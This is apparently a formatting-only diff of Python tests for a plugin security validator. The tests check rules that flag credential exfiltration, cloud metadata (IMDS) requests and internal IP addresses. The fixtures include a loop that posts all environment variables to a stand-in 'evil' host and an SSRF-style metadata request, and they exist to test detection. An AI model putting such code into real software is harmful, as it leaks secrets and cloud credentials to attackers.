@@ -79,25 +79,27 @@ class TestRc21SubprocessPrep:
         assert _rc21_is_subprocess_prep(line, ["pass"]) is False
 
     def test_full_pipeline_skips_subprocess_prep(self, tmp_path: Path) -> None:
-        plugin = _make_plugin(tmp_path, {
-            "src/launcher.py": (
-                "import subprocess\n"
-                "env = os.environ.copy()\n"
-                "subprocess.Popen(['cmd'], env=env)\n"
-            ),
-        })
+        plugin = _make_plugin(
+            tmp_path,
+            {
+                "src/launcher.py": ("import subprocess\nenv = os.environ.copy()\nsubprocess.Popen(['cmd'], env=env)\n"),
+            },
+        )
         report = ValidationReport()
         check_phase1_credential_rules(plugin, report)
         assert not _msgs(report, "RC-21")
 
     def test_full_pipeline_keeps_iteration_signal(self, tmp_path: Path) -> None:
-        plugin = _make_plugin(tmp_path, {
-            "src/exfil.py": (
-                "import requests\n"
-                "for k in dict(os.environ):\n"
-                "    requests.post('http://evil', data={k: os.environ[k]})\n"
-            ),
-        })
+        plugin = _make_plugin(
+            tmp_path,
+            {
+                "src/exfil.py": (
+                    "import requests\n"
+                    "for k in dict(os.environ):\n"
+                    "    requests.post('http://evil', data={k: os.environ[k]})\n"
+                ),
+            },
+        )
         report = ValidationReport()
         check_phase1_credential_rules(plugin, report)
         assert _msgs(report, "RC-21")
@@ -196,21 +198,30 @@ class TestRc87SemverContext:
         assert _rc87_is_semver_context(line, "src/connect.py") is False
 
     def test_full_pipeline_skips_package_json_semver(self, tmp_path: Path) -> None:
-        plugin = _make_plugin(tmp_path, {
-            "package.json": json.dumps({
-                "name": "my-pkg",
-                "version": "1.0.0",
-                "dependencies": {"@types/node": "^10.0.5"},
-            }, indent=2),
-        })
+        plugin = _make_plugin(
+            tmp_path,
+            {
+                "package.json": json.dumps(
+                    {
+                        "name": "my-pkg",
+                        "version": "1.0.0",
+                        "dependencies": {"@types/node": "^10.0.5"},
+                    },
+                    indent=2,
+                ),
+            },
+        )
         report = ValidationReport()
         check_phase4_all(plugin, report)
         assert not _msgs(report, "RC-87")
 
     def test_full_pipeline_keeps_real_rfc1918_in_source(self, tmp_path: Path) -> None:
-        plugin = _make_plugin(tmp_path, {
-            "src/leak.py": "INTERNAL_HOST = '10.0.0.5'\n",
-        })
+        plugin = _make_plugin(
+            tmp_path,
+            {
+                "src/leak.py": "INTERNAL_HOST = '10.0.0.5'\n",
+            },
+        )
         report = ValidationReport()
         check_phase4_all(plugin, report)
         assert _msgs(report, "RC-87")
@@ -289,17 +300,23 @@ class TestSurroundingLines:
         assert result == ["a", "b"]
 
 
-@pytest.mark.parametrize("imds", [
-    "169.254.169.254",
-    "100.100.100.200",
-])
+@pytest.mark.parametrize(
+    "imds",
+    [
+        "169.254.169.254",
+        "100.100.100.200",
+    ],
+)
 class TestRc65DetectionStillWorks:
     """Regression: the v2.41 guard does not break the phase-2e RC-65 detection."""
 
     def test_real_imds_call_in_source_still_flagged(self, tmp_path: Path, imds: str) -> None:
-        plugin = _make_plugin(tmp_path, {
-            "src/ssrf.py": f"requests.get('http://{imds}/latest/meta-data/')\n",
-        })
+        plugin = _make_plugin(
+            tmp_path,
+            {
+                "src/ssrf.py": f"requests.get('http://{imds}/latest/meta-data/')\n",
+            },
+        )
         report = ValidationReport()
         check_phase2e_extras(plugin, report)
         assert _msgs(report, "RC-65"), f"expected RC-65 for {imds!r}"
